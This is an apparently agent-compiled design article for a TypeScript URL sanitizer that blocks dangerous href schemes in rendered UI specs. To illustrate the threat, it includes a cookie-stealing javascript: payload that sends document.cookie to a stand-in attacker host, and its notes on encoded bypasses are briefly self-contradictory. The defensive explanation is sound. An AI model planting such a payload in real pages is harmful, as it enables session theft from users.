---
{
  "title": "URL Sanitizer — XSS-Safe Href Utility",
  "summary": "A focused security utility that strips dangerous URL schemes before they reach the DOM, preventing XSS attacks through javascript:, data:, and file: hrefs. Added as a blocker fix in PR #14 when externally-supplied Pocket spec URLs were found to flow directly into href attributes.",
  "concepts": [
    "XSS prevention",
    "URL sanitization",
    "javascript: scheme",
    "allowlist",
    "href safety",
    "Pocket spec security",
    "data: scheme",
    "vbscript: scheme",
    "input validation",
    "security utility"
  ],
  "categories": [
    "security",
    "utility"
  ],
  "source_docs": [
    "e970409f3a778cec"
  ],
  "backlinks": null,
  "word_count": 505,
  "compiled_at": "2026-04-23T18:36:05Z",
  "compiled_with": "agent",
  "version": 1,
  "audience": "human",
  "depth": "deep",
  "target_words": 500
}
---

## Purpose

Ripple renders UI from externally-authored Pocket specs. Those specs can include arbitrary URL strings — for link buttons, image sources, or navigation targets. Without validation, a spec author (or an attacker who controls spec delivery) could inject `javascript:alert(1)` and have it execute in the user's browser the moment the rendered element is clicked.

`url-sanitizer.ts` is the single enforcement point for this rule. Every URL that will become an `href` or similar attribute in rendered output must pass through `safeKbUrl` first.

## The `safeKbUrl` Function

```typescript
export function safeKbUrl(raw: string | undefined): string | null
```

The function accepts a raw string (or `undefined`) and returns either the original string unchanged or `null`. It never transforms the URL — it only decides whether to pass it through or block it. Callers render `null` as a missing link or a disabled state, not as an empty string that could itself be exploited.

### Allowlist Logic

The function applies a strict allowlist rather than a blocklist:

- **`undefined` or empty string** — returns `null` immediately. An absent URL should produce no link at all.
- **Relative paths** (`/...`) — allowed. These stay within the same origin and cannot carry a foreign scheme.
- **`http://` and `https://`** — allowed. These are the only absolute schemes Ripple legitimately needs for external content.
- **Everything else** — blocked, returning `null`. This silently covers `javascript:`, `data:`, `file:`, `vbscript:`, `blob:`, and any future exotic schemes without needing an explicit per-scheme rule.

### Why Allowlist, Not Blocklist?

A blocklist approach — enumerating dangerous schemes — fails when new dangerous schemes emerge or when encoding tricks (e.g., `&#106;avascript:`) bypass the check. An allowlist is closed by default: anything not explicitly permitted is rejected, making the security boundary easier to audit and harder to bypass.

## Failure Scenario This Prevents

Without this guard, a Pocket spec containing:

```json
{ "type": "Button", "href": "javascript:fetch('https://attacker.com/?c='+document.cookie)" }
```

would silently render as a clickable link. The moment a user clicks it, arbitrary JavaScript executes in the page's origin — full XSS. The same risk applies to `data:text/html,...` payloads that open injected HTML in the browser.

## Integration Pattern

Callers in kb-article rendering check the return value before binding:

```typescript
const href = safeKbUrl(spec.href);
// Only render anchor if href is non-null
```

This pattern ensures the sanitizer can never be silently skipped — a `null` return is semantically distinct from an empty string.

## Known Gaps

- **No normalization**: The function trims whitespace but does not decode percent-encoding or HTML entities before checking. A URL like `%6aavascript:` would pass the allowlist check (it doesn't start with `/`, `http://`, or `https://`) and would be blocked — but only because it doesn't match the allowlist, not because it was decoded and recognized. This is correct behavior but should be documented for future maintainers.
- **No return of the sanitized form**: The function returns the raw trimmed string, so any whitespace-padded http URL passes through with its original spacing stripped only at the leading/trailing edge. Internal whitespace is not normalized.